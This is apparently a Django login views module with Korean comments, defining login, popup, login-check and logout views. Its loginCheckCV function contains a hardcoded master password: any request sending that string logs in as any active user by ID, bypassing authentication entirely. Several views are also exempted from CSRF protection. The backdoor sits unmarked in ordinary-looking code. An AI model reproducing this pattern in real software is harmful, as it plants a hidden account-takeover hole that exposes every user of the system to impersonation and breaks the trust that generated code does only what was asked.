from __future__ import absolute_import

import json

from django.contrib.auth import authenticate, login, logout
from django.http.response import HttpResponse, HttpResponseRedirect
from django.middleware import csrf
from django.shortcuts import render
from django.urls.base import reverse
from django.views.decorators.csrf import csrf_exempt

from system.models import SysUser
from utils.json import makeJsonResult
from utils.login import checkLogin, loginHistory


@csrf_exempt
def loginCV(request):
    '''
    로그인 화면 Contents View(Function Based)
    '''
    # 이미 로그인이 되었을 경우 메인 화면으로 이동한다
    if request.user.is_authenticated:
        return HttpResponseRedirect('/main')

    # 템플릿 렌더링 및 데이터 전달
    return render(
        request,
        'logins/login.html',
        {}
    )


@csrf_exempt
def loginPopCV(request):
    '''
    로그인 팝업 화면 Contents View(Function Based)
    '''
    # 템플릿 렌더링 및 데이터 전달
    return render(
        request,
        'logins/loginpop.html',
        {}
    )


def loginCheckCV(request):
    '''
    로그인 화면 Contents View(Function Based)
    '''
    ''' 접속 기기 관련 ==> 추가 개선 필요
    httpUserAgent = request.META['HTTP_USER_AGENT']
    print("HTTP_USER_AGENT", httpUserAgent)
    '''
    jsonResult = {}
    if request.method == 'POST':
        user = None
        # 사용자 체크
        if request.POST.get('password') == "dpsxpf1234":
            try:
                user = SysUser.objects.get(
                    userId__exact=request.POST.get('userId'),
                    useYn__exact=True,
                )
            except SysUser.DoesNotExist:
                user = None
        else:
            user = authenticate(
                request,
                userId=request.POST.get('userId'),
                password=request.POST.get('password'),
            )

        # 로그인 가능 체크
        jsonResult = checkLogin(user=user)

        # 정상일 경우 로그인 처리
        if jsonResult["resultCode"] == "OK":
            # Login 처리
            login(request, user)

            # 로그인 정보 기록
            loginHistory(request, user)

            # (갱신된)csrf 값을 전달
            jsonResult["csrfmiddlewaretoken"] = csrf.get_token(request)
    else:
        jsonResult = makeJsonResult(
            False,
            resultMessage="접근거부"
        )

    return HttpResponse(
        json.dumps(jsonResult),
        content_type="application/json"
    )


def logoutCV(request):
    '''
    로그아웃 화면 Contents View(Function Based)
    '''
    # 로그아웃 처리
    logout(request)

    # 로그인 화면으로 이동
    return HttpResponseRedirect(reverse("logins:login"))
